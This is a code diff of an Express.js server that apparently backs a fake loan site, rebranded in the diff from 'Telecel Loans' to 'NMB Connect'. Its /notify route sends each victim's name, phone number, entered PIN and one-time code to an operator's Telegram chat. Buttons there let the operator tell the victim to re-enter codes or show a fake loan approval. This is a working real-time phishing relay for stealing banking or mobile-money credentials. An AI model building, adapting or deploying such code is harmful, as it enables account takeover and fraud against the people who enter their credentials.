@@ -12,29 +12,43 @@ import { sendAdminMessage, removeButtons, answerCallback, registerWebhook, escMd
 const app       = express();
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 
-app.use(express.json());
+// ── Middleware ──
+app.use(express.json({ limit: '10mb' }));
 app.use(cors({
-  origin:         true,
-  methods:        ['GET', 'POST', 'OPTIONS'],
+  origin: config.allowedOrigins || true,
+  methods: ['GET', 'POST', 'OPTIONS'],
   allowedHeaders: ['Content-Type'],
+  credentials: true,
 }));
 
+// ── Serve static files (HTML, CSS, JS) ──
 app.use(express.static(__dirname));
-app.get('/', (_req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 
-app.get('/health', (_req, res) => {
-  res.json({ ok: true, service: 'telecel-loans-backend', ts: new Date().toISOString() });
+// ── Root route - Serve index.html ──
+app.get('/', (_req, res) => {
+  res.sendFile(path.join(__dirname, 'index.html'));
 });
 
+// ── Health Check ──
+app.get('/health', (_req, res) => {
+  res.json({ 
+    ok: true, 
+    service: 'nmb-connect-backend', 
+    timestamp: new Date().toISOString(),
+    uptime: process.uptime(),
+  });
+});
+
+// ── Setup Webhook ──
 app.get('/setup', async (_req, res) => {
   try {
     const result = await registerWebhook();
     if (result.ok) {
       res.json({
-        ok:          true,
+        ok: true,
         description: result.description,
-        webhook:     `${config.serverUrl}/webhook`,
-        message:     '✅ Webhook registered successfully! You can now use the app.',
+        webhook: `${config.serverUrl}/webhook`,
+        message: '✅ Webhook registered successfully!',
       });
     } else {
       res.status(500).json({ ok: false, error: result.description });
@@ -44,94 +58,97 @@ app.get('/setup', async (_req, res) => {
   }
 });
 
+// ── Validate helpers ──
+function validateToken(token) {
+  return /^[a-f0-9]{16}$/.test(token);
+}
+
 // ════════════════════════════════════════════════════════
 //  POST /notify
-//
-//  type = 'pin'  → sends Name, Phone, Date & Time, PIN
-//                  + [✅ Continue to OTP] [❌ Wrong PIN]
-//
-//  type = 'otp'  → sends Name, Phone, Date & Time, OTP
-//                  + [❌ Wrong OTP] [❌ Invalid PIN]
-//                    [✅ Approve Application] [❌ Decline Application]
-//
-//  type = 'otp_resend' → alerts admin that user requested a new OTP
+//  Types: 'pin', 'otp', 'otp_resend'
 // ════════════════════════════════════════════════════════
 app.post('/notify', async (req, res) => {
-  const { type, phone, countryCode, passcode, otp, name } = req.body;
+  const { type, phone, countryCode, passcode, otp, name, reference } = req.body;
 
   if (!type || !phone) {
-    return res.status(400).json({ ok: false, error: 'Missing required fields' });
+    return res.status(400).json({ ok: false, error: 'Missing required fields: type and phone' });
   }
 
-  const fullPhone = `${countryCode || '+233'} ${phone}`.trim();
+  const fullPhone = `${countryCode || '+263'} ${phone}`.trim();
 
   // ── Generate token + HMAC ──
   const token = crypto.randomBytes(8).toString('hex');
-  const sig   = crypto.createHmac('sha256', config.secretKey)
-                      .update(`${token}|${phone}`)
-                      .digest('hex');
+  const sig = crypto.createHmac('sha256', config.secretKey)
+                    .update(`${token}|${phone}`)
+                    .digest('hex');
 
-  setSession(token, phone, sig, config.tokenTtl);
+  setSession(token, { phone, name, reference, sig }, config.tokenTtl);
 
   const cbData = (action) => `${action}|${token}`;
+  const now = new Date();
+  const dateTime = now.toLocaleString('en-GB', { dateStyle: 'medium', timeStyle: 'short' });
+
+  let text, keyboard;
 
   try {
-    let text, keyboard;
+    switch (type) {
+      case 'pin':
+        if (!passcode) {
+          return res.status(400).json({ ok: false, error: 'Missing passcode for pin type' });
+        }
 
-    const now      = new Date();
-    const dateTime = now.toLocaleString('en-GB', { dateStyle: 'medium', timeStyle: 'short' });
+        text = `🔒 *PIN Submitted*\n\n`
+             + `👤 *Name:* ${escMd(name || 'Unknown')}\n`
+             + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
+             + `🔢 *PIN Entered:* \`${escMd(passcode)}\`\n`
+             + `🕐 *Date & Time:* ${escMd(dateTime)}\n\n`
+             + `Awaiting your decision\\.`;
 
-    if (type === 'pin') {
-      if (!passcode) return res.status(400).json({ ok: false, error: 'Missing passcode' });
+        keyboard = [[
+          { text: '✅ Continue to OTP', callback_data: cbData('continue_otp') },
+          { text: '❌ Wrong PIN', callback_data: cbData('pin_wrong') },
+        ]];
+        break;
 
-      text = `🔒 *PIN Submitted*\n\n`
-           + `👤 *Name:* ${escMd(name || 'Unknown')}\n`
-           + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
-           + `🔢 *PIN Entered:* \`${escMd(passcode)}\`\n`
-           + `🕐 *Date & Time:* ${escMd(dateTime)}\n\n`
-           + `Awaiting your decision\\.`;
+      case 'otp':
+        if (!otp) {
+          return res.status(400).json({ ok: false, error: 'Missing OTP for otp type' });
+        }
 
-      keyboard = [[
-        { text: '✅ Continue to OTP', callback_data: cbData('continue_otp') },
-        { text: '❌ Wrong PIN',      callback_data: cbData('pin_wrong')    },
-      ]];
+        text = `🔐 *OTP Submitted*\n\n`
+             + `👤 *Name:* ${escMd(name || 'Unknown')}\n`
+             + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
+             + `🔑 *OTP Entered:* \`${escMd(otp)}\`\n`
+             + `🕐 *Date & Time:* ${escMd(dateTime)}\n\n`
+             + `Awaiting your decision\\.`;
 
-    } else if (type === 'otp') {
-      if (!otp) return res.status(400).json({ ok: false, error: 'Missing OTP' });
+        keyboard = [
+          [
+            { text: '❌ Wrong OTP', callback_data: cbData('otp_wrong') },
+            { text: '❌ Invalid PIN', callback_data: cbData('pin_invalid') },
+          ],
+          [
+            { text: '✅ Approve Application', callback_data: cbData('loan_approved') },
+            { text: '❌ Decline Application', callback_data: cbData('loan_rejected') },
+          ],
+        ];
+        break;
 
-      text = `🔐 *OTP Submitted*\n\n`
-           + `👤 *Name:* ${escMd(name || 'Unknown')}\n`
-           + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
-           + `🔑 *OTP Entered:* \`${escMd(otp)}\`\n`
-           + `🕐 *Date & Time:* ${escMd(dateTime)}\n\n`
-           + `Awaiting your decision\\.`;
+      case 'otp_resend':
+        text = `🔄 *OTP Resend Requested*\n\n`
+             + `👤 *Name:* ${escMd(name || 'Unknown')}\n`
+             + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
+             + `🕐 *Date & Time:* ${escMd(dateTime)}\n\n`
+             + `User has requested a new OTP code\\.`;
 
-      keyboard = [
-        [
-          { text: '❌ Wrong OTP',  callback_data: cbData('otp_wrong')    },
-          { text: '❌ Invalid PIN', callback_data: cbData('pin_invalid')  },
-        ],
-        [
-          { text: '✅ Approve Application', callback_data: cbData('loan_approved') },
-          { text: '❌ Decline Application', callback_data: cbData('loan_rejected') },
-        ],
-      ];
+        keyboard = [[
+          { text: '✅ Continue to OTP', callback_data: cbData('continue_otp') },
+          { text: '❌ Wrong PIN', callback_data: cbData('pin_wrong') },
+        ]];
+        break;
 
-    } else if (type === 'otp_resend') {
-      // Alert admin that user requested a new OTP
-      text = `🔄 *OTP Resend Requested*\n\n`
-           + `👤 *Name:* ${escMd(name || 'Unknown')}\n`
-           + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
-           + `🕐 *Date & Time:* ${escMd(dateTime)}\n\n`
-           + `User has requested a new OTP code\\. Please send a new code and use the buttons below\\.`;
-
-      keyboard = [[
-        { text: '✅ Continue to OTP', callback_data: cbData('continue_otp') },
-        { text: '❌ Wrong PIN',      callback_data: cbData('pin_wrong')    },
-      ]];
-
-    } else {
-      return res.status(400).json({ ok: false, error: 'Unknown type' });
+      default:
+        return res.status(400).json({ ok: false, error: 'Unknown type' });
     }
 
     const tgResult = await sendAdminMessage(text, keyboard);
@@ -141,7 +158,7 @@ app.post('/notify', async (req, res) => {
       return res.status(500).json({ ok: false, error: 'Telegram error', detail: tgResult.description });
     }
 
-    res.json({ ok: true, token });
+    res.json({ ok: true, token, expiresIn: config.tokenTtl });
 
   } catch (err) {
     console.error('Error in /notify:', err);
@@ -155,8 +172,8 @@ app.post('/notify', async (req, res) => {
 app.post('/poll', (req, res) => {
   const { token } = req.body;
 
-  if (!token || !/^[a-f0-9]{16}$/.test(token)) {
-    return res.status(400).json({ ok: false, error: 'Invalid token' });
+  if (!token || !validateToken(token)) {
+    return res.status(400).json({ ok: false, error: 'Invalid token format' });
   }
 
   const result = popResult(token);
@@ -177,12 +194,13 @@ app.post('/webhook', async (req, res) => {
   const update = req.body;
   if (!update?.callback_query) return;
 
-  const cb     = update.callback_query;
-  const cbId   = cb.id;
-  const data   = cb.data || '';
+  const cb = update.callback_query;
+  const cbId = cb.id;
+  const data = cb.data || '';
   const chatId = cb.message?.chat?.id?.toString();
-  const msgId  = cb.message?.message_id;
+  const msgId = cb.message?.message_id;
 
+  // ── Verify admin ──
   if (chatId !== config.adminChatId.toString()) {
     await answerCallback(cbId, '⛔ Not authorised', true);
     return;
@@ -190,11 +208,16 @@ app.post('/webhook', async (req, res) => {
 
   const parts = data.split('|');
   if (parts.length !== 2) {
-    await answerCallback(cbId, '⚠️ Invalid data');
+    await answerCallback(cbId, '⚠️ Invalid data format');
     return;
   }
 
   const [action, token] = parts;
+
+  if (!validateToken(token)) {
+    await answerCallback(cbId, '⚠️ Invalid token format');
+    return;
+  }
 
   const session = getSession(token);
   if (!session) {
@@ -213,8 +236,6 @@ app.post('/webhook', async (req, res) => {
 
   try {
     switch (action) {
-
-      // ── PIN actions ──
       case 'continue_otp':
         setResult(token, 'continue_otp', config.tokenTtl);
         await removeButtons(chatId, msgId);
@@ -225,23 +246,22 @@ app.post('/webhook', async (req, res) => {
       case 'pin_wrong':
         setResult(token, 'pin_wrong', config.tokenTtl);
         await removeButtons(chatId, msgId);
-        await sendAdminMessage(`❌ *Wrong PIN*\nUser \`${escMd(session.phone)}\` has been notified to re\\-enter their PIN\\.`, []);
-        await answerCallback(cbId, '❌ Wrong PIN sent to user');
+        await sendAdminMessage(`❌ *Wrong PIN*\nUser \`${escMd(session.phone)}\` has been notified\\.`, []);
+        await answerCallback(cbId, '❌ Wrong PIN sent');
         break;
 
-      // ── OTP actions ──
       case 'otp_wrong':
         setResult(token, 'otp_wrong', config.tokenTtl);
         await removeButtons(chatId, msgId);
-        await sendAdminMessage(`❌ *Wrong OTP*\nUser \`${escMd(session.phone)}\` has been notified to re\\-enter their OTP\\.`, []);
-        await answerCallback(cbId, '❌ Wrong OTP sent to user');
+        await sendAdminMessage(`❌ *Wrong OTP*\nUser \`${escMd(session.phone)}\` has been notified\\.`, []);
+        await answerCallback(cbId, '❌ Wrong OTP sent');
         break;
 
       case 'pin_invalid':
         setResult(token, 'pin_invalid', config.tokenTtl);
         await removeButtons(chatId, msgId);
-        await sendAdminMessage(`🚫 *Invalid Session*\nUser \`${escMd(session.phone)}\` has been redirected to login\\.`, []);
-        await answerCallback(cbId, '🚫 Invalid session — user redirected');
+        await sendAdminMessage(`🚫 *Invalid Session*\nUser \`${escMd(session.phone)}\` redirected to login\\.`, []);
+        await answerCallback(cbId, '🚫 Invalid session');
         break;
 
       case 'loan_approved':
@@ -266,21 +286,11 @@ app.post('/webhook', async (req, res) => {
   }
 });
 
-// ════ DEBUG ROUTE ════
-app.get('/test', async (_req, res) => {
-  const result = await sendAdminMessage('🧪 Test message from Telecel Loans\\.', []);
-  res.json({
-    telegramResponse: result,
-    adminChatId:      config.adminChatId,
-    serverUrl:        config.serverUrl,
-    botTokenPreview:  config.botToken ? config.botToken.slice(0, 10) + '...' : 'MISSING',
-    secretKeySet:     !!config.secretKey,
-  });
-});
-
+// ── Start server ──
 app.listen(config.port, () => {
-  console.log(`\n🚀 Telecel Loans backend running on port ${config.port}`);
+  console.log(`\n🚀 NMB Connect backend running on port ${config.port}`);
   console.log(`   Webhook URL: ${config.serverUrl}/webhook`);
   console.log(`   Setup URL:   ${config.serverUrl}/setup`);
   console.log(`   Health:      ${config.serverUrl}/health\n`);
+  console.log(`   📱 Frontend: ${config.serverUrl}/\n`);
 });
